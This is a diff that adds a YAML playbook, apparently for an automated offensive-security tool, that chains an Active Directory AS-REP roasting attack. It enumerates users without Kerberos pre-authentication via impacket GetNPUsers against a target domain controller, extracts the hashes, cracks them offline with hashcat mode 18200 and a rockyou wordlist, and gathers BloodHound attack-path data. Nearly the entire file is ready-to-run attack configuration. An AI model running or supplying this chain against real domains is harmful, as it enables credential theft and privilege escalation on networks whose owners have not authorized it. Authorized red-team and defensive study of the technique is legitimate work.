@@ -1,0 +1,61 @@
+name: "AS-REP Roasting Chain"
+description: "Modern AD attack: enumerate users with pre-auth disabled, extract AS-REP hashes, crack offline, map attack paths with BloodHound."
+category: ad
+attack_vector: "AS-REP Roasting — no pre-auth user exploitation"
+variables:
+  target:
+    required: true
+    description: "Target domain controller IP"
+  domain:
+    required: true
+    description: "AD domain (e.g. corp.local)"
+  user:
+    required: true
+    description: "Domain user (can be guest/low-priv)"
+  password:
+    required: false
+    description: "Optional password (blank for null session)"
+  wordlist:
+    required: false
+    default: "/usr/share/wordlists/rockyou.txt"
+    description: "Wordlist for hashcat"
+cutting_edge: true
+references: ["Attack: AS-REP Roasting", "MITRE ATT&CK T1558.004"]
+
+steps:
+  - name: "get_np_users"
+    tool: "impacket_tools"
+    description: "Extract AS-REP hashes for users with Do not require Kerberos pre-authentication"
+    args:
+      tool: "GetNPUsers"
+      target: "{{domain}}/ -dc-ip {{target}} -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -format hashcat"
+    expected_output: "\\$krb5asrep|No entries found"
+    timeout: 300
+    gate: false
+    retries: 2
+    extracts:
+      - var: "asrep_hash"
+        regex: "\\$krb5asrep\\$[^\\s]+"
+
+  - name: "crack_asrep"
+    tool: "hashcat_crack"
+    description: "Crack the AS-REP hash offline"
+    args:
+      hash_file: "output/get_np_users.stdout.txt"
+      wordlist: "{{wordlist}}"
+      mode: 18200
+      attack_mode: 0
+    expected_output: null
+    timeout: 3600
+    gate: false
+    retries: 1
+
+  - name: "bloodhound_collect"
+    tool: "bloodhound_analyze"
+    description: "Collect AD attack path data for BloodHound analysis"
+    args:
+      neo4j_url: "bolt://localhost:7687"
+    expected_output: null
+    timeout: 300
+    gate: false
+    retries: 1
